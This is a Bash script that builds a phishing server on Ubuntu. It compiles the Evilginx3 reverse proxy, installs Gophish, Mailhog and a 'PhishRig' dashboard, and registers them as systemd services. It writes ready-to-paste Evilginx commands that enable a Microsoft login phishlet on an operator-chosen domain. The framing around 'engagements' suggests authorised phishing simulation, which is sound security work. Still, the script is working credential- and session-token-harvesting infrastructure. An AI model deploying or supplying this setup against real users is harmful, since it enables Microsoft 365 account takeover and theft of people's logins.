#!/bin/bash
# ==== Evilginx3 (v3.3.0) + Gophish + Mailhog Setup Script (Ubuntu 20.04) ====

set -euo pipefail

# Capture the script directory BEFORE any cd commands change the working directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

cleanup() {
  echo ""
  echo "Installation interrupted or failed. Partial install may exist."
  echo "Re-run this script to continue or fix issues manually."
}
trap cleanup ERR

# ==== Input: Domain ====
if [ -n "${1:-}" ]; then
  DOMAIN="$1"
else
  read -rp "Enter your phishing domain (e.g. login.yourdomain.com): " DOMAIN
fi

if [ -z "$DOMAIN" ]; then
  echo "Error: Domain cannot be empty."
  exit 1
fi

# ==== Variables ====
EMAIL="admin@$DOMAIN"
GOPHISH_PORT=8800
MAILHOG_UI_PORT=8025
MAILHOG_SMTP_PORT=1025
GOPHISH_VERSION="0.12.1"
GO_VERSION="1.22.3"
EVILGINX_DIR="/opt/evilginx2"
PHISHLETS_PATH="$EVILGINX_DIR/phishlets"
SERVICE_USER="phishlab"

# Resolve public IP once
echo "Resolving public IP..."
PUBLIC_IP="$(curl -sf ifconfig.me || curl -sf icanhazip.com || true)"
if [ -z "$PUBLIC_IP" ]; then
  echo "Error: Could not determine public IP address."
  exit 1
fi
echo "Public IP: $PUBLIC_IP"

# ==== Idempotency: skip steps if already done ====
is_installed() { command -v "$1" &>/dev/null; }

# ==== Update & Install Base Packages ====
echo "Installing base packages..."
apt update && apt upgrade -y
apt install -y git make curl unzip ufw build-essential ca-certificates \
  gnupg lsb-release libcap2-bin net-tools jq wget

# ==== Create Service User ====
if ! id "$SERVICE_USER" &>/dev/null; then
  useradd -r -s /usr/sbin/nologin -d /opt "$SERVICE_USER"
fi

# ==== Install Go ====
if ! is_installed go || [[ "$(go version 2>/dev/null)" != *"$GO_VERSION"* ]]; then
  echo "Installing Go $GO_VERSION..."
  cd /tmp
  curl -LO "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
  rm -rf /usr/local/go && tar -C /usr/local -xzf "go${GO_VERSION}.linux-amd64.tar.gz"
  rm -f "go${GO_VERSION}.linux-amd64.tar.gz"
else
  echo "Go $GO_VERSION already installed, skipping."
fi

export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
chmod +x /etc/profile.d/go.sh
grep -qxF 'export PATH=$PATH:/usr/local/go/bin' /root/.bashrc 2>/dev/null \
  || echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc

# ==== Install Evilginx3 (v3.3.0) ====
if [ ! -f "$EVILGINX_DIR/dist/evilginx" ]; then
  echo "Building Evilginx3 v3.3.0..."
  cd /opt
  rm -rf "$EVILGINX_DIR"
  git clone --branch v3.3.0 https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"
  cd "$EVILGINX_DIR"
  mkdir -p dist
  go build -o dist/evilginx main.go
  setcap cap_net_bind_service=+ep dist/evilginx
  chown -R "$SERVICE_USER":"$SERVICE_USER" "$EVILGINX_DIR"
else
  echo "Evilginx3 binary already exists, skipping build."
fi

# ==== Copy Bundled Phishlets ====
if [ -d "$SCRIPT_DIR/phishlets" ]; then
  echo "Copying bundled phishlets..."
  cp "$SCRIPT_DIR"/phishlets/*.yaml "$PHISHLETS_PATH/" 2>/dev/null || true
  chown -R "$SERVICE_USER":"$SERVICE_USER" "$PHISHLETS_PATH"
  echo "Phishlets installed: $(ls "$PHISHLETS_PATH"/*.yaml 2>/dev/null | wc -l) files"
fi

# ==== Evilginx Config Commands Reference ====
cat <<EOF > /root/evilginx_setup_commands.txt
# Run these commands inside the Evilginx interactive prompt:
#   $EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH
#
# Then paste each line below:

config domain $DOMAIN
config ip $PUBLIC_IP
config redirect_url https://login.microsoftonline.com/
config autocert on
phishlets hostname microsoft $DOMAIN
phishlets enable microsoft
EOF

echo "Evilginx setup commands saved to /root/evilginx_setup_commands.txt"

# ==== Build PhishRig ====
LABDIR="$SCRIPT_DIR"
if [ ! -f /usr/local/bin/phishrig ] || [ "$LABDIR/cmd/phishrig/main.go" -nt /usr/local/bin/phishrig ]; then
  echo "Building PhishRig..."
  cd "$LABDIR"
  apt install -y gcc libsqlite3-dev 2>/dev/null || true
  go mod download
  mkdir -p dist
  CGO_ENABLED=1 go build -ldflags "-s -w" -o dist/phishrig ./cmd/phishrig
  install -m 755 dist/phishrig /usr/local/bin/phishrig
  mkdir -p /var/lib/phishrig
  chown "$SERVICE_USER":"$SERVICE_USER" /var/lib/phishrig
  echo "phishrig binary installed to /usr/local/bin/phishrig"
else
  echo "phishrig binary is up to date, skipping build."
fi

# ==== Install Gophish ====
GOPHISH_DIR="/opt/gophish"
GOPHISH_URL="https://github.com/gophish/gophish/releases/download/v${GOPHISH_VERSION}/gophish-v${GOPHISH_VERSION}-linux-64bit.zip"

if [ ! -f "$GOPHISH_DIR/gophish" ]; then
  echo "Installing Gophish v${GOPHISH_VERSION}..."
  cd /opt
  curl -LO "$GOPHISH_URL"
  unzip -o "gophish-v${GOPHISH_VERSION}-linux-64bit.zip" -d gophish
  rm -f "gophish-v${GOPHISH_VERSION}-linux-64bit.zip"
  chmod +x "$GOPHISH_DIR/gophish"
else
  echo "Gophish already installed, skipping."
fi

# Configure Gophish: bind admin to localhost (use SSH tunnel for access), disable TLS
cd "$GOPHISH_DIR"
jq --arg port "127.0.0.1:$GOPHISH_PORT" \
   '.admin_server.listen_url = $port | .admin_server.use_tls = false' \
   config.json > config.json.tmp && mv config.json.tmp config.json

chown -R "$SERVICE_USER":"$SERVICE_USER" "$GOPHISH_DIR"

# ==== Install Mailhog ====
if [ ! -f /usr/local/bin/mailhog ]; then
  echo "Installing Mailhog..."
  wget -O /usr/local/bin/mailhog \
    https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
  chmod +x /usr/local/bin/mailhog
else
  echo "Mailhog already installed, skipping."
fi

# ==== Setup UFW Firewall ====
echo "Configuring firewall..."
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow "$GOPHISH_PORT"/tcp
ufw allow "$MAILHOG_UI_PORT"/tcp
ufw --force enable

# ==== Systemd Services ====

# Evilginx3 service
cat <<EOF > /etc/systemd/system/evilginx.service
[Unit]
Description=Evilginx3 Phishing Proxy
After=network.target

[Service]
Type=simple
User=$SERVICE_USER
WorkingDirectory=$EVILGINX_DIR
ExecStart=$EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Gophish service
cat <<EOF > /etc/systemd/system/gophish.service
[Unit]
Description=Gophish Phishing Server
After=network.target

[Service]
Type=simple
User=$SERVICE_USER
WorkingDirectory=$GOPHISH_DIR
ExecStart=$GOPHISH_DIR/gophish
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Mailhog service
cat <<EOF > /etc/systemd/system/mailhog.service
[Unit]
Description=Mailhog SMTP Testing Server
After=network.target

[Service]
ExecStart=/usr/local/bin/mailhog \
  -smtp-bind-addr=127.0.0.1:$MAILHOG_SMTP_PORT \
  -api-bind-addr=0.0.0.0:$MAILHOG_UI_PORT \
  -ui-bind-addr=0.0.0.0:$MAILHOG_UI_PORT
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# PhishRig dashboard service
cat <<EOF > /etc/systemd/system/phishrig.service
[Unit]
Description=PhishRig Dashboard
After=network.target evilginx.service gophish.service

[Service]
Type=simple
User=root
WorkingDirectory=$LABDIR
ExecStart=/usr/local/bin/phishrig deploy -c $LABDIR/phishrig.yaml
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now evilginx gophish mailhog

# ==== Post-Install Verification ====
printf "\nVerifying service availability...\n"

for svc in evilginx gophish mailhog phishrig; do
  if systemctl is-active --quiet "$svc"; then
    echo "[OK] $svc is running"
  else
    echo "[FAIL] $svc failed to start - check: journalctl -u $svc"
  fi
done

printf "\nActive listeners:\n"
netstat -tuln | grep -E ":(80|443|$GOPHISH_PORT|$MAILHOG_UI_PORT|$MAILHOG_SMTP_PORT)" || true

# ==== Capture Gophish Initial Password ====
printf "\nWaiting for Gophish to generate initial password...\n"
sleep 3
GOPHISH_INITIAL_PASS=$(journalctl -u gophish --no-pager -n 50 | grep -oP 'Please login with the username admin and the password \K\S+' || true)

# ==== Completion Output ====
printf "\n========================================\n"
printf "  Setup Complete\n"
printf "========================================\n\n"

echo "Domain:       $DOMAIN"
echo "Public IP:    $PUBLIC_IP"
echo ""
echo "Evilginx3:    running as systemd service 'evilginx'"
echo "  Binary:     $EVILGINX_DIR/dist/evilginx"
echo "  Setup:      Paste commands from /root/evilginx_setup_commands.txt into evilginx prompt"
echo "  Note:       Stop the service first, then run interactively to configure:"
echo "              systemctl stop evilginx"
echo "              $EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH"
echo ""
echo "Gophish:      http://127.0.0.1:$GOPHISH_PORT (access via SSH tunnel)"
echo "  SSH tunnel: ssh -L $GOPHISH_PORT:127.0.0.1:$GOPHISH_PORT root@$PUBLIC_IP"
echo "  Username:   admin"
if [ -n "$GOPHISH_INITIAL_PASS" ]; then
  echo "  Password:   $GOPHISH_INITIAL_PASS (initial - you will be prompted to change it)"
else
  echo "  Password:   Check with: journalctl -u gophish | grep password"
fi
echo ""
echo "Mailhog:      http://$PUBLIC_IP:$MAILHOG_UI_PORT"
echo "  SMTP:       localhost:$MAILHOG_SMTP_PORT (configure as Gophish sending profile)"
echo ""
echo "PhishRig CLI: /usr/local/bin/phishrig"
echo "  Dashboard: http://127.0.0.1:8443 (access via SSH tunnel)"
echo "  SSH tunnel: ssh -L 8443:127.0.0.1:8443 root@$PUBLIC_IP"
echo "  Commands:   phishrig init    - initialize engagement from phishrig.yaml"
echo "              phishrig deploy  - start services + dashboard"
echo "              phishrig status  - show engagement summary"
echo ""
echo "Quick Start:"
echo "  1. Copy configs/engagement.example.yaml to phishrig.yaml"
echo "  2. Edit phishrig.yaml with your engagement details"
echo "  3. Run: phishrig init -c phishrig.yaml"
echo "  4. Run: phishrig deploy -c phishrig.yaml"
echo ""
echo "To configure Gophish -> Mailhog integration:"
echo "  1. Open Gophish admin UI"
echo "  2. Go to Sending Profiles"
echo "  3. Set SMTP host to: localhost:$MAILHOG_SMTP_PORT"
